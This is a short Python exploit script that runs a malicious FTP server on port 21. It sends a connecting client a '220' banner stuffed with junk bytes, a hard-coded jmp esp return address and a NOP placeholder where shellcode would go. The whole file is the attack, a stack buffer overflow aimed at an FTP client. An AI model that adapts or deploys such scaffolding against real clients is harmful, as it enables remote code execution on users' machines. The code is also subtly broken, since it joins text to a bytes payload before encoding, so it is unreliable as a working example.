#!/usr/bin/python

from socket import *

payload = b"\xa1" * 989  # junk bytes
payload += b"\x5f\x06\xa1\x75"  # jmp/call esp address (75a1065f)
payload += b"\x90" * 16  # shellcode

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 21))
s.listen(1)
print("[+] Listening on [FTP] 21")
c, addr = s.accept()

print("[+] Connection accepted from: %s" % (addr[0]))

c.send(("220 " + payload + "\r\n").encode())
c.recv(1024)
c.close()
print("[+] Client exploited !! quitting")
s.close()
